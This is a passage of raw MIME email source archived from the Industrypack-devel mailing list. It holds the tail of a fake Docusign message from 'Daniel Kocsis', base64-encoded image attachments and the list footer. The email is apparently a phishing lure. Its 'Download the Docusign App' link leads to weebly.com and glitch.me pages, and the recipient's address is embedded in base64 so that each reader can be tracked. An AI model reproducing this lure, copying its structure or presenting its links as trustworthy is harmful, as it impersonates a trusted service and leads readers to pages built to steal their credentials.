 the link." style=3D"BORDER-LEFT-WIDTH: 0px; BORDER-RIGHT-WIDTH: 0px; VERTI=
CAL-ALIGN: baseline; BORDER-BOTTOM-WIDTH: 0px; COLOR: rgb(36,99,209); PADDI=
NG-BOTTOM: 0px; PADDING-TOP: 0px; PADDING-LEFT: 0px; MARGIN: 0px; PADDING-R=
IGHT: 0px; BORDER-TOP-WIDTH: 0px"=20
href=3D"https://5r678943683.weebly.com/" rel=3D"noopener noreferrer" target=
=3D_blank data-saferedirecturl=3D"https://www.google.com/url?q=3Dhttps://do=
c-3783462378123782323-23789347634763489230.glitch.me%23%5B%5Bconvert_to_bas=
e64(-Email-,TRUE)%5D%5D&amp;source=3Dgmail&amp;ust=3D1731600212740000&amp;u=
sg=3DAOvVaw3v74z7b1i8LuPUER7hovqk">
<img style=3D"BORDER-TOP: medium none; BORDER-RIGHT: medium none; VERTICAL-=
ALIGN: middle; BORDER-BOTTOM: medium none; PADDING-BOTTOM: 0px; PADDING-TOP=
: 0px; PADDING-LEFT: 0px; MARGIN: 0px 7px 0px 0px; BORDER-LEFT: medium none=
; PADDING-RIGHT: 0px" alt=3D"https://doc-3783462378123782323-23789347634763=
489230.glitch.me#aW5kdXN0cnlwYWNrLWRldmVsQGxpc3RzLnNvdXJjZWZvcmdlLm5ldA=3D=
=3D" src=3D"cid:icon-download-app.png" width=3D"18" height=3D"18">Download =
the Docusign App</A></P>
<P style=3D'MARGIN-BOTTOM: 1em; FONT-SIZE: 10px; FONT-FAMILY: Helvetica, Ar=
ial, "Sans Serif"; COLOR: rgb(102,102,102); LINE-HEIGHT: 14px'>This message=
 was sent to you by Daniel Kocsis who is using the Docusign Electronic Sign=
ature Service. If you would rather not receive email from this sender you m=
ay contact the sender with your request.</P></TD></TR></TBODY></TABLE></BOD=
Y></HTML>
------=_NextPart_000_0012_B03FB8B3.F3BE087B
Content-Type: image/png; name="email-logo.png"
Content-Transfer-Encoding: base64
Content-ID: <email-logo.png>

iVBORw0KGgoAAAANSUhEUgAAAOQAAAAyCAYAAABMMHe/AAAABHNCSVQICAgIfAhkiAAAChZJ
REFUeJztnc9u3LgZwH/KnwWaQzv7BtpLgaCHOKfeNkrPRTNZX/a2yhM4eQKPn8DOE3hyW2AX
iIM+gJV9gTi9F2aKvQVtpijgg3fX6uETMbKGlEhJM9I4/AGDxBqJH0XyI/l9/MiBQCAQCAQC
q0SuN+bffHMIPO8gSxFFijx/wxdfnETff686pBUI3EhuOd8ZRTsdZcXkeQIccnl5nu/uHuff
fht3TLMv9oBPQA4kw2YlUCIBUj6jOnFXyL7J85TLy9N8d3c6WB5gCpwDR8BkwHwEVjkGTkv/
vuMzqKPhFFKIyfPX+e7udwPIToDXQDyA7EA9afEps0M3k2krGFohhTw/GtH0NTA8tg56iI57
o4xDIWHCL78cD52JwGhYeF6/MYxFISHPk4HtycB4eOl5/cYwHoUU9obOQGAUZMBB5doBMN94
TjbMuBQyz5NgSwYKZsCXwFfFv7MhM7MpxqWQAJeXydBZCIyGBaD4DGxHzZ2/ke/l4lKu5S+n
f47z2+eNCcb37rF//z7xvXvtcpTnXQMQAoGt5c6VLIo38o//3OPffHRKNPv4kdOvv26rlHGb
hyrscL2TUYhd0jeTQk5ckaU/fclIuL4oroAzxj1yxFyPsFFIfs8GlJ+tWWa1rvT7KtcE7vSe
JUBdXPD4p5/aKeWtW39oKXaCOIWeY47oUIhToOosaEMC7CPKaIseOUO8gvOOMpKaezLgVYOM
OavrdwqxzZpIkUiZKl9hbmRNdQDSSE+AN8W/Tewh9uMEeEb9u2r5KeaOXcs+YJn/GVLOZQ64
brPOWS3Dpyzzn1BfV85tYW02pFZKdXGxLhFldAjcDHtDiIvvz2k/CsdIGNcpq6NWlR2kMZ/j
YBLUyKgjKcmIPWSsg+9orgOK71IkSuqc1YgcTYpfWGOMhNfNsJeFln3OqhL6Mik+hzTXlW4L
jTLX6tTZkFLuIZXrGucYIxX3xFNOjJuS2OS5RJl0lTGU/T1Fen/fWNMYaajHXFei2HCtjh3k
/V3vh+XI+MDjmTKPCpk+4XyzpvvX7mX1Vsqrq/96JJ/gaANXmOBXkDGiKHELWZo59UrZVcak
4/NtiZFRogsp7TuTGL8OucwM6UzakNKurPepyetabMgq6uKCVx8+sH//fvPNUeRj9NeF22l7
4QNSAI9oX+l1Dd1HzhHwFrP9VTcilGU8YNWRpJkU6Ty2pLMOEkte5oidqB1PE6TxPzLcf4Cb
PWli3yIflk6V98XfD1jfVi6F2PS6jhLMiqcHg5kpkY0opBfuCplir4iXyAtXvZBTpDe3Pecr
5wXmEdomR9scTw0yEosM27s8x9zbJkV6c0t6fWMa9eeIA6aKVrqUpSIp2i/6J9ht0JMiD9Vy
i5ERtc/pvakd1Ml5ZEtofIEBv/2WOd5pM5APkMZqWhI4QUYP5ZEjm5xn2KfLWo4pD1NWlcgm
4wX2dzliVbE1m9wVYRoFXjU8MwceIp1Nl9Hc9p4vkbIxlZsqZGcd5JaxdcoKexuwdgbjUsgo
mkcnJy5rawn2adKs4VmFuff2lTN3kPPC8l3ZfrVNP+c028cZ1wOuF0iHZJO7DkwKmTg8t0DK
QXWQmxquK9z8A6bR0xdFfR0tkGl7lQmWWdfYFLKpZ9XYehjX5zPcesjEct11LXOOudLLUxab
DNd3mRVyHrOM+dzU4juITVxln3rbrg9sbcC1bhTuZWzDRZZXXYxHIaNoHv34Y+Z4t2kOvsBv
GmJqSC5yvCIvMFd6uTF1fZcF0tu73t83c8v1GbLed4rYzVP6VVCbQmYeabR1JGlclM1rFB6L
Qiru3vWJoDFNk3xHBZf7TXI+9CCnPGWJDd9vcoTrSka9EiTIFFIHApwjnuCuTpXYcG2BX2fZ
tZx7r6cxKOSC27efeh4LaVIUn+dFbjs5nzzltJGhepaxbp7iPv2LEdvvHd3ONDKVm69N2MWG
7Gp/GhlaIRW3bz+Ofvhhm0YEX9ZScSNjgSjZM/w6kynDRhh1YViFvNvvCXziDby6ethSGb1c
yRbavtCXnvfHDd/38S6bxtYY50jg+WPE++tqFpziXx/KcC32TGd05ewcGPAnDvl9h/x/+t8i
g3+94datM3799cxxecOGyY6LkcpwTTdxuOeMVYWyLupaMMVKlm2d96w2jKrMsdFUxhlLu3LC
cjvcI8yharXRKxaU5foO7o6d7VXI3xHzxw4B8v/8mbfRz1HTuporZ6wuCuuKzxzTcAkuf8tq
A5ogyuwqJzFcO6v83/QurjJixEnyqrhfVb6v/q3TdyE2XGtjp2XF5wh7BMsT/BQys1zfr/nO
dO+oGNqGbIvNXe1awCluo5BtyuUqx7YWV3aAdH0XvQ9Pb8M6ZnVjbpUJbjME27JPmRS/hq0w
By60mbIqw/UEt3fbY4QzkW1VSIW5F0xo3nmw43CPJquR09QId7D3+OU0VQcZejNumbTynClt
HNJOMDfs95W/95H3HGKnic2z27R1K2Gkh2Ztq0KCvTKeY66QCdJ4fB0ItvXRWYOcd5bn5qz2
7G1kHGIP2yqXjcKu8LaGO0WmlSbKI3pSej5hufHXlKZmgnmXjqp5xsYR5il0jHm9M2H5WyG9
ein7Yny7PdyZI7ZXYvguLT5nSIXphfg2lZAhjdDkjPCVozArX4Z4JU3n0moZWfG8jn21yThh
NXrmFW7lBPXHkiiuK7cpuHtWfDIkjlMVaceIgyu1pN8mjE289fYZT4p9N8go2WaFBFn3qvtV
pDovmlYgVzlaEXzllOXV7TSZIY4Nm4zEQYbCbJ/NEWW35dPV21jtTOqilhLc9x4q2m8XO0Ly
32aHi08b2AjbPGWF+i0uLs8px/ublKmP57vKUA3PP+2QNphPDp/R/dAwRfcN1Sn+I6xCtmEN
ScL1Q7n2tl0hQaZbD3FvbBnSAM48noHlSW2+DTBD8ueySK5Y7hP0ldGkzMrhHhMLZNSdWb6f
IeXSZsqZtcyTiZTrp8nVMUfK2daR95EfFzJAH1kzBabbPmXVKKRRpNjtygypsKx0reoxhObR
dsZy36XpOAqdxgnLtUEfFohj6mgNMhTLcnpC/cl5qkjb5jip3puyPKNGp21igXRO1bqoYvpO
NeRjhtRNgrQDbQ/rQIy3SJnptOvyWJVbzU9TXsppVZ8ty1iU8qeiv5If0f7kLWciePl3Itua
W9/oIAFY/3H0ZVnQ7yHJmqqjpU8ZMasHPetGso60VQ/p9sURZkea64wmEAgYSGnnnDkH8sqn
+fcyAoGAlZilIsUez+2zqow59ScZBgKBGiasjnIuR4ccYlbGnPUdExkI3HjqFOs14hxLis8U
UdZPNc+cbjLzgcBNwjQ6dvl8YoTB5oHANhHTn1KmG815IHBDmSDLF11GxnTTmQ4EbjoxEhRQ
ZyOabMZ44zmtIRo6A4HAGpgijpwHLH/HEa7/+M6cz+MAskAgEAgEbgD/B8R1CWdQYfbcAAAA
AElFTkSuQmCC

------=_NextPart_000_0012_B03FB8B3.F3BE087B
Content-Type: image/png; name="docinvite-white.png"
Content-Transfer-Encoding: base64
Content-ID: <docinvite-white.png>

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

------=_NextPart_000_0012_B03FB8B3.F3BE087B
Content-Type: image/png; name="icon-download-app.png"
Content-Transfer-Encoding: base64
Content-ID: <icon-download-app.png>

iVBORw0KGgoAAAANSUhEUgAAACQAAAAkCAYAAADhAJiYAAAABHNCSVQICAgIfAhkiAAAAYFJ
REFUWIXtlztOw0AQQN9EiQvSgKjShR7xUS4QegpkN5RwA24QcgLgBHGZAqIgDoA5AIIDRLCu
adIEikgeCmQJAsgbg+Mt8rrdnfU8eWcsr2CJBsEDqju28d8QeQQegWu5uhr+GmYt5PvPQDO3
0FcM0JXBIJxdqPxTgnlpAj31/c7sQllCKacaBL3PE2ULgeqR+v5JOixf6IOOHh42wR2hVabT
DpTXZT+TJGuuvKEPKpUjt4REtmUfvVWLo3iqbzbfMJnPPGg0ONvayqtkqkDbppDiyYRXJplx
56MR4+mUXquVR2i1kCML45jj+/s8W4sRgvxShRZ1Dqlx4V02l5SIWUjbRy8vdoFJErv2HRq6
JeR5kTtCIpH0+4upIStEuuDK74dIKJeXEbghZKjVuumgbCGD5+1Jv2/SifKEVC9Ikt3PMgBV
2/3rtIEoV+4V6gAGEYPqHZ4XzoqkyD6qubLMgYC5QTZsYsuuoW8shbJYCmWxFMrCPSHB4vb3
RxTGtrHvJxJytcnIFP4AAAAASUVORK5CYII=

------=_NextPart_000_0012_B03FB8B3.F3BE087B--



--===============0787182484466872123==
Content-Type: text/plain; charset="us-ascii"
MIME-Version: 1.0
Content-Transfer-Encoding: 7bit
Content-Disposition: inline


--===============0787182484466872123==
Content-Type: text/plain; charset="us-ascii"
MIME-Version: 1.0
Content-Transfer-Encoding: 7bit
Content-Disposition: inline

_______________________________________________
Industrypack-devel mailing list
Industrypack-devel@lists.sourceforge.net
https://lists.sourceforge.net/lists/listinfo/industrypack-devel

--===============0787182484466872123==--


